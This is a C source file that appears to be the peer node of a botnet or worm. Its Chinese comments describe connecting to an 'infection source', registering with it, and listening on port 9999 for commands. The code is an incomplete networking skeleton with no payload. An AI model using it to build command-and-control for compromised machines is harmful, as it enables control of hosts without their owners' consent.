#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <pthread.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include "peer.h"
int main(int argc, char **argv) {
    //argv1:感染元IP
    //argv2:感染元端口
    // Accept the Inputs and call the init Function
    if(argc<3){
        printf("You must input two args.<source IP> <source PORT>\n");
        return 0;
    }
    int clientSock;
    int AsServerSock;
    struct sockaddr_in AsServer;
    struct sockaddr_in client;
    int AsServerListeningPort = atoi("9999");//会在节点注册的时候传给服务端
    int sockaddr_len = sizeof(struct sockaddr_in);
    //作为客户端
    client.sin_family = AF_INET;
    client.sin_port = htons(atoi(argv[2]));
    client.sin_addr.s_addr = inet_addr(argv[1]);
    memset(client.sin_zero, '\0', sizeof(client.sin_zero));
    //作为服务器
    AsServer.sin_family = AF_INET;
    AsServer.sin_port = htons(AsServerListeningPort);
    AsServer.sin_addr.s_addr = INADDR_ANY;
    memset(AsServer.sin_zero, '\0', sizeof(AsServer.sin_zero));

    if ((clientSock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("clientSock socket error\n");
        exit(-1);
    }

    // inititalize peerAsServer socket descriptor
    if ((AsServerSock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("server socket error\n");
        exit(-1);
    }

    pthread_t tid; // only one thread to have a non-blocking listening to multiple clients

    if (bind(AsServerSock, (struct sockaddr *) &AsServer, sockaddr_len) == -1) {
        perror("binding error\n");
        exit(-1);
    }
    //起一个线程去处理发送到该服务器的请求与命令
    if (pthread_create(&tid, NULL, threadedListen, &AsServerSock) != 0) {
        perror("Failed to create thread\n");
    }
    //连服务端
    while(connect(clientSock,(struct sockaddr*)&client,sizeof(struct sockaddr)) == -1);
    //向感染源请求注册
    registerPeer(clientSock, AsServerListeningPort);
    //todo:将感染源添加进路由器
    //循环更新路由表
    while (1) {
    }
    return 0;
}